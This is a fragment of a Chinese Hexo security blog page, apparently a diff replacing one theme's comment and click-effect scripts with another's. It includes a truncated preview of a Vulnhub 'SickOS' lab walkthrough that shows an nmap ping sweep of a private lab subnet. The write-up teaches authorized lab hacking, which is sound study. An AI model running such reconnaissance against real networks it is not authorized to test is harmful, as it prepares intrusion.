href="/2026/06/28/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0%E9%9D%B6%E6%9C%BA--SickOS/" title="vulnhub靶机--SickOS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-28</div><div class="info-item-2">vulnhub靶机--SickOS</div></div><div class="info-2"><div class="info-item-1">vulnhub靶机–SickOS1.主机发现和信息收集1234567891011121314151617181920212223242526272829303132333435╭─ /home/kali/Desktop  with root@kali at 23:50:08 ─╮╰─❯ nmap -sn 192.168.8.0/24                                                                                                              Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-22 23:50 EDTNmap scan report for 192.168.8.1 (192.168.8.1)Host is up (0.0044s latency).MAC Address: 14:D8:64:93:00:07 (TP-Link Technologies)Nmap scan report for 192.168....</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="utterances-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/wgqs.jpg" onerror="this.onerror=null;this.src='/images/1.png'" alt="avatar"/></div><div class="author-info-name">K1r1t5u6u</div><div class="author-info-description">今夕何夕，见此良人</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/web218"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/web218" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #181717;"></i></a><a class="social-icon" href="https://space.bilibili.com/3537106320230948" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #FF8EB3;"></i></a><a class="social-icon" href="https://qm.qq.com/q/3nByicuAkg" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #87CEEB;"></i></a><a class="social-icon" href="https://mail.163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #8E71C1;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">逆水行舟不进则退</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%92%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一.主机发现和信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-GET-Shell"><span class="toc-number">2.</span> <span class="toc-text">二.GET Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">三.权限提升:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">攻击原理</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/24/thinkphp/php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/" title="PHP面向对象编程基础">PHP面向对象编程基础</a><time datetime="2026-07-24T07:35:37.870Z" title="发表于 2026-07-24 15:35:37">2026-07-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/" title="SQLite注入">SQLite注入</a><time datetime="2026-07-23T05:30:00.000Z" title="发表于 2026-07-23 13:30:00">2026-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/22/Vulnhub%E9%9D%B6%E6%9C%BA--LAMPSecurity%20CTF5/" title="Vulnhub靶机--LAMPSecurity CTF5">Vulnhub靶机--LAMPSecurity CTF5</a><time datetime="2026-07-22T02:15:33.653Z" title="发表于 2026-07-22 10:15:33">2026-07-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/05/Vulnhub%E9%9D%B6%E6%9C%BA--Prime/" title="Vulnhub靶机--Prime">Vulnhub靶机--Prime</a><time datetime="2026-07-05T09:28:13.720Z" title="发表于 2026-07-05 17:28:13">2026-07-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/30/SSRF%E8%BF%9B%E9%98%B6--Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%88%B0RCE/" title="SSRF进阶--Redis主从复制到RCE">SSRF进阶--Redis主从复制到RCE</a><time datetime="2026-06-30T01:48:29.129Z" title="发表于 2026-06-30 09:48:29">2026-06-30</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By K1r1t5u6u</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.6.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.6.1"></script><script src="/js/main.js?v=5.6.1"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+  const getUtterancesTheme = theme => theme === 'dark' ? 'github-dark' : 'github-light'
+
+  const loadUtterances = (el = document, key) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyUtterances = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const config = {
+      src: 'https://utteranc.es/client.js',
+      repo: 'web218/web218.github.io',
+      theme: getUtterancesTheme(document.documentElement.getAttribute('data-theme')),
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      'issue-term': isShuoshuo ? key : (option && option['issue-term']) || 'pathname'
+    }
+
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => ele.setAttribute(key, value))
+    el.querySelector('#utterances-wrap').appendChild(ele)
+  }
+
+  const changeUtterancesTheme = theme => {
+    const iframe = document.querySelector('#utterances-wrap iframe')
+    if (iframe) {
+      const message = {
+        type: 'set-theme',
+        theme: getUtterancesTheme(theme)
+      };
+      iframe.contentWindow.postMessage(message, 'https://utteranc.es')
     }
   }
-  function sync() {
-    setTheme(document.documentElement.classList.contains('dark') ? themes.dark : themes.light);
+
+  btf.addGlobalFn('themeChange', changeUtterancesTheme, 'utterances')
+
+  if (isShuoshuo) {
+    'Utterances' === 'Utterances'
+      ? window.shuoshuoComment = { loadComment: loadUtterances }
+      : window.loadOtherComment = loadUtterances
+    return
   }
-  function waitForFrame(cb) {
-    var frame = document.querySelector('.utterances-frame');
-    if (frame) {
-      frame.addEventListener('load', cb);
-      // if already loaded
-      if (frame.contentWindow) setTimeout(cb, 100);
-      return;
-    }
-    setTimeout(function() { waitForFrame(cb) }, 200);
+  
+  if ('Utterances' === 'Utterances' || !false) {
+    if (false) btf.loadComment(document.getElementById('utterances-wrap'), loadUtterances)
+    else loadUtterances()
+  } else {
+    window.loadOtherComment = loadUtterances
   }
-  function onReady() { sync(); }
-  // listen for dark mode toggle click
-  document.addEventListener('click', function(e) {
-    var btn = e.target.closest('#toggle-mode-btn');
-    if (btn) setTimeout(onReady, 200);
-  });
-  // watch html class change
-  var obs = new MutationObserver(function() { onReady(); });
-  obs.observe(document.documentElement, { attributes: true, attributeFilter: ['class'] });
-  // initial sync when iframe ready
-  waitForFrame(onReady);
-})();</script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2025 – 2026 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:heart-3-line"></span></span><span class="author"> K1r1t5u6u</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script>(function(){
-  var words = ['富强✨','民主🌟','文明🔥','和谐💫','自由🎉','平等🎊','公正⚖️','法治📜','爱国❤️','敬业💪','诚信🤝','友善🌈'];
-  function spawn(e) {
-    var el = document.createElement('span');
-    el.textContent = words[Math.floor(Math.random() * words.length)];
-    el.style.cssText = 'position:fixed;left:' + (e.clientX - 20) + 'px;top:' + (e.clientY - 20) + 'px;font-size:20px;white-space:nowrap;color:hsl(' + (Math.random() * 360) + ',80%,60%);pointer-events:none;z-index:9999;transition:all 1.2s ease-out;opacity:1;transform:translateY(0)';
-    document.body.appendChild(el);
-    requestAnimationFrame(function() {
-      el.style.transform = 'translateY(-80px)';
-      el.style.opacity = '0';
-    });
-    setTimeout(function() { el.remove() }, 1400);
-  }
-  document.addEventListener('pointerdown', spawn, true);
-})();</script></body></html>
+})()</script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.6.1"></script></div></div></body></html>
